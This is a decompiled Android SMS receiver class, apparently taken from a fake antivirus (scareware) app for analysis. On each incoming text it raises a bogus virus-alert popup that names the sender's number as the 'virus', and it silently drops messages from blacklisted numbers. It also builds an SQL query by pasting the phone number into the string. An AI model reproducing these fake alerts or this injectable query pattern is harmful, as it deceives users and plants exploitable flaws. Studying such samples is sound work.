package com.worker.androiddefender2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.example.androiddefender2.DefenderApplication;
import com.example.androiddefender2.VirusInfoDialogActivity;
import system.AppSingleton;

public class MessageReceiver extends BroadcastReceiver {
  protected AppSingleton as;
  
  private String phoneNumber = "";
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    Bundle bundle = paramIntent.getExtras();
    DefenderApplication.getInstance();
    boolean bool = paramContext.getSharedPreferences(DefenderApplication.APP_PREF, 0).getBoolean("chkMessages", false);
    if (bundle != null) {
      Object[] arrayOfObject = (Object[])bundle.get("pdus");
      SmsMessage[] arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
      for (byte b = 0; b < arrayOfSmsMessage.length; b++) {
        arrayOfSmsMessage[b] = SmsMessage.createFromPdu((byte[])arrayOfObject[b]);
        this.phoneNumber = arrayOfSmsMessage[b].getOriginatingAddress();
        if ((DefenderApplication.getInstance()).virusesDefine && bool && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
          DefenderApplication.getInstance();
          if (!DefenderApplication.isCurAutoScan) {
            Intent intent = new Intent(paramContext, VirusInfoDialogActivity.class);
            intent.addFlags(268435456);
            intent.putExtra("typePopup", 3);
            intent.putExtra("virusName", this.phoneNumber);
            paramContext.startActivity(intent);
          } 
        } 
        this.as = AppSingleton.getInstance();
        this.as.getDB(paramContext.getApplicationContext());
        String str = "SELECT * FROM black_list WHERE sms='true' AND number = '" + SystemFunctions.prepareNumber(this.phoneNumber) + "'";
        if (this.as.mainDB.getOneScanSettingsRow(str) != null) {
          (new SystemFunctions()).generateNotification(paramContext, paramContext.getResources().getString(2131099742), String.format(paramContext.getResources().getString(2131099743), new Object[] { this.phoneNumber }));
          abortBroadcast();
        } 
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/MessageReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */